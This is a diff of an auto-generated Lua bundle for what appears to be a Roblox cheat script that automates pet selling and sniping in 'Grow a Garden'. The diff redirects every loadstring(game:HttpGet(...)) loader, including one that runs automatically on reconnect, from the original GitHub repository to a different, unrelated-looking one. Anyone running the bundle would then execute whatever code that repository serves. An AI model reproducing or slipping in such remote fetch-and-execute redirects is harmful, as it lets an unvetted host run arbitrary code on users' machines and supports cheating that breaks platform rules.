@@ -1,6 +1,6 @@
 -- AUTO-GENERATED oleh tools/bundle.js — JANGAN edit manual.
 -- Edit modul-nya langsung, terus run `node tools/bundle.js`.
--- 14 modul, di-generate 2026-08-30T03:26:50.703Z
+
 return {
 	["app.lua"] = [=[
 --[[ app.lua — inisialisasi akhir: default page, supervisor auto-claim, auto-resume. ]]
@@ -46,7 +46,7 @@ return function(ctx)
 		local GuiService = game:GetService("GuiService")
 		local TeleportService = game:GetService("TeleportService")
 		local branch = (getgenv and getgenv().GAG_BRANCH) or "main"
-		local RECON = ("getgenv().GAG_BRANCH='%s';loadstring(game:HttpGet('https://raw.githubusercontent.com/Tirta71/ScriptMarketGAG/%s/GAGSeller/init.lua'))()"):format(branch, branch)
+		local RECON = ("getgenv().GAG_BRANCH='%s';loadstring(game:HttpGet('https://raw.githubusercontent.com/caturambis-hash/agakgila//%s/apainicok/init.lua'))()"):format(branch, branch)
 		local reconnecting = false
 		local function reconnect()
 			if reconnecting or CFG.autoReconnect == false then return end -- cek toggle real-time
@@ -138,7 +138,7 @@ return function(ctx)
 	-- di-destroy langsung berhenti -> ga ada dobel sniper.
 	local function running() return ctx.state.snipeRunning == true and ctx.alive() end
 
-	local ROUTER = "loadstring(game:HttpGet('https://raw.githubusercontent.com/Tirta71/ScriptMarketGAG/main/GAGSeller/init.lua'))()"
+	local ROUTER = "loadstring(game:HttpGet('https://raw.githubusercontent.com/caturambis-hash/agakgila/main/apainicok/init.lua'))()"
 
 	------------------------------------------------------------------ helpers
 	local function buildItemData(petType)
@@ -1903,7 +1903,7 @@ return function(ctx)
 	local function log(m) ctx.log(m) end
 	local function setStatus(s) ctx.setStatus(s) end
 
-	local ROUTER = "loadstring(game:HttpGet('https://raw.githubusercontent.com/Tirta71/ScriptMarketGAG/main/GAGSeller/init.lua'))()"
+	local ROUTER = "loadstring(game:HttpGet('https://raw.githubusercontent.com/caturambis-hash/agakgila/main/apainicok/init.lua'))()"
 
 	-- waktu jual terakhir; reset tiap ada yang beli dari kita -> penanda booth aktif.
 	ctx.state.lastSaleAt = os.time()
